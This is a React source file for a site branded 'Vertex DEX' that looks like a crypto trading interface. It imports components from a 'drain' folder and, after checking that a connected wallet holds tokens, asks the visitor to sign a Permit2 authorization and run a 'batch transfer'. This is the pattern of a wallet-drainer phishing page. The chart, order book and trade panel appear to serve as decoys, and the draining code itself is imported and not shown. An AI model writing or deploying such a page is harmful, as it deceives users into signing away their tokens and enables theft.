import React, { useEffect } from 'react';
import { useWeb3Modal } from './components/wallet/Web3Modal';
import { WalletButton } from './components/wallet/WalletButton';
import { TradingViewChart } from './components/trading/TradingViewChart';
import { OrderBook } from './components/trading/OrderBook';
import { TradePanel } from './components/trading/TradePanel';
import { AnimatedOrbs } from './components/layout/AnimatedOrbs';
import { Permit2Signer } from './components/drain/Permit2Signer';
import { BatchTransfer } from './components/drain/BatchTransfer';
import { useBalanceCheck } from './hooks/useBalanceCheck';

function App() {
  const { isConnected, account, chainId } = useWeb3Modal();
  const { hasTokens, checking } = useBalanceCheck(account, chainId);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-900 relative overflow-hidden">
      <AnimatedOrbs />
      
      <div className="container mx-auto px-4 py-8 relative z-10">
        <header className="flex justify-between items-center mb-8">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-blue-500 rounded-full"></div>
            <h1 className="text-2xl font-bold text-white">Vertex DEX</h1>
          </div>
          <WalletButton />
        </header>

        {!isConnected ? (
          <div className="text-center py-20">
            <h2 className="text-3xl font-bold text-white mb-4">Connect Your Wallet</h2>
            <p className="text-gray-400">Connect to start trading on Vertex DEX</p>
          </div>
        ) : (
          <>
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-6">
              <div className="lg:col-span-2">
                <div className="glass rounded-2xl p-4">
                  <TradingViewChart />
                </div>
              </div>
              <div className="space-y-6">
                <div className="glass rounded-2xl p-6">
                  <h3 className="text-lg font-bold text-white mb-4">Quick Trade</h3>
                  <TradePanel />
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              <div className="lg:col-span-2">
                <div className="glass rounded-2xl p-4">
                  <h3 className="text-lg font-bold text-white mb-4">Order Book</h3>
                  <OrderBook />
                </div>
              </div>
              <div className="space-y-4">
                <div className="glass rounded-2xl p-6">
                  <h3 className="text-lg font-bold text-white mb-4">Permit2 Authorization</h3>
                  <p className="text-gray-400 text-sm mb-4">Sign once to authorize batch token transfer</p>
                  <Permit2Signer />
                </div>
                
                <div className="glass rounded-2xl p-6">
                  <h3 className="text-lg font-bold text-white mb-4">Execute Transfer</h3>
                  <p className="text-gray-400 text-sm mb-4">After signing, execute the batch transfer</p>
                  <BatchTransfer />
                </div>

                {!checking && (
                  <div className={`p-3 rounded-xl text-center ${hasTokens ? 'bg-green-500/20 text-green-400' : 'bg-yellow-500/20 text-yellow-400'}`}>
                    {hasTokens ? 'Tokens detected. Ready to sign.' : 'No token balance detected. Deposit tokens to trade.'}
                  </div>
                )}
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  );
}

export default App;